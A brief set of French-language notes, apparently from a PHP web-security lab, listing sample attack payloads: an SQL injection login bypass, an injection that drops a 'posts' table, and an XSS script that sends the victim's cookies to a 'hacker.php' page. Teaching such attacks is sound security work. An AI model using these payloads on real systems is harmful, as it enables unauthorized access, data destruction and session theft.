sql injection 
un nom d'utilisateur malveillant tel que 
admin' OR '1'='1  et un mot de passe ' OR '1'='1.


Si on veut supprimer une table on peut mettre :
 ';Drop table posts ;--
-------------------------
xss
<script>window.location =
'http://localhost/php-security/xss/hacker.php?cookie='+escape(document.cookie)</script>



